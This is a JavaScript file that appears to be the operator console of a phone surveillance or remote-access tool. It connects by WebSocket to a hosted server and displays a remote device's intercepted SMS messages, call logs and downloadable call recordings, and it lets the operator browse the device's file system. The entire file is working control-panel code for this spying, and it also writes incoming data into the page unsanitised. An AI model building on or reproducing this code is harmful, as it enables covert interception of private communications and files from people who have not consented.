/*var check = function() {
    var check = {
        "type": "check",
        "clientId": clientId
    };
    wsClient.send(JSON.stringify(check));
};
var json;
function submit (json) {

    var form = document.createElement('form');
    form.method =  "POST";
    form.action = "download";

    var input = document.createElement('input');
    input.type = "hidden";
    input.name = "fileType";
    input.value = json.fileType;
    form.innerHTML += input;

    input = document.createElement('input');
    input.type = "hidden";
    input.name = "fileName";
    input.value = json.fileName;
    form.innerHTML += input;

    input = document.createElement('input');
    input.type = "hidden";
    input.name = "deviceId";
    input.value = json.deviceId;
    form.innerHTML += input;

    form.submit();
}*/
var wsClient;
function connectWs(clientId) {

    wsClient = new WebSocket('wss://server-animus.rhcloud.com:8443/wss');

    wsClient.onopen = function () {
        var jsonIdObject = {
            'type': 'client',
            'clientId': clientId,
            'name': 'Client'
        };
        wsClient.send( JSON.stringify(jsonIdObject) );
    };

    wsClient.onmessage = function (message) {

        var json = JSON.parse(message.data);
        var alert;

        switch (json.type) {
            case 'result':
                createAlert('alertResult', 'alert-info', json.response.replace(/\n/g, '<br/>'), 0);
                break;
            case 'state':
                createAlert('alertState', 'alert-info', json.response, 0);
                break;
            case 'error':
                createAlert('alertError', 'alert-danger', json.response, 3000);
                break;
            case 'file':
                var url = 'download?' +
                    'deviceId=' + json.deviceId +
                    '&fileType=' + json.fileType +
                    '&fileName=' + json.fileName;
                if (json.fileType == 'call') {
                    (document.getElementsByClassName('alertLiveCalls')[0]).childNodes[1].innerHTML +=
                        "<br/>File " + json.fileName + ", received from " + json.deviceId + ". " +
                        "<a href='"+url+"' target='_blank'>Download</a>";
                } else {
                    createAlert('alertFile', 'alert-info',
                        "File " + json.fileName + ", received from " + json.deviceId + ". " +
                        "<a href='" + url + "' target='_blank'>Download</a>", 0);
                }
                break;
            case 'live':
                switch (json.liveType) {
                    case 'sms':
                        if ((alert = document.getElementsByClassName('alertLiveSMS')[0]) == null) {
                            createAlert('alertLiveSMS', 'alert-info', json.sms, 0);
                        } else alert.childNodes[1].innerHTML += json.sms.replace(/\n/g, '<br/>');
                        break;
                    case 'calls':
                        if ((alert = document.getElementsByClassName('alertLiveCalls')[0]) == null) {
                            createAlert('alertLiveCalls', 'alert-info', json.calls, 0);
                        } else alert.childNodes[1].innerHTML += json.calls.replace(/\n/g, '<br/>');
                        break;
                }
                break;
            case 'fileManager':
                var response = json.response.split('|');
                var currentPath = response[0];
                var files = (response[1]).split(':');

                if (document.getElementsByClassName('alertFileManager')[0] == null) {
                    alert = createAlert('alertFileManager', 'alert-info', '', 0);
                } else alert = document.getElementsByClassName('alertFileManager')[0];

                var alertContent = alert.childNodes[1];
                alertContent.innerHTML = '';

                var currentDirectory = document.createElement('p');
                currentDirectory.innerText = 'Current directory: ' + currentPath;
                alertContent.appendChild(currentDirectory).appendChild(document.createElement('br'));

                if (currentPath == '/') {
                    currentPath = '';
                } else {
                    var goBack = document.createElement('a');
                    goBack.style.cursor = 'pointer';
                    goBack.onclick = function () {
                        currentPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
                        sendFm(currentPath + '/:');
                    };
                    goBack.innerText = '../';
                    alertContent.appendChild(goBack).appendChild(document.createElement('br'));
                }

                files.forEach(function (file) {
                    if (currentPath == '/')
                        currentPath = '';
                    var fileLink = document.createElement('a');
                    fileLink.style.cursor = 'pointer';
                    fileLink.onclick = function() {sendFm(currentPath + '/' + file + ':');};
                    fileLink.innerText = file;
                    alertContent.appendChild(fileLink).appendChild(document.createElement('br'));
                });
                break;
        }

        if ( (alert = document.getElementsByClassName('executing')[0]) != null )
            alert.remove();
        else if ( (alert = document.getElementsByClassName('alertState')[0]) != null )
            alert.remove();
    };

    wsClient.onclose = function () {
        console.log('WEB-SOCKET CLOSED.');
    };

    wsClient.onerror = function () {
        console.log('WEB-SOCKET ERROR.');
    };

    //setInterval(check, 10000);
}
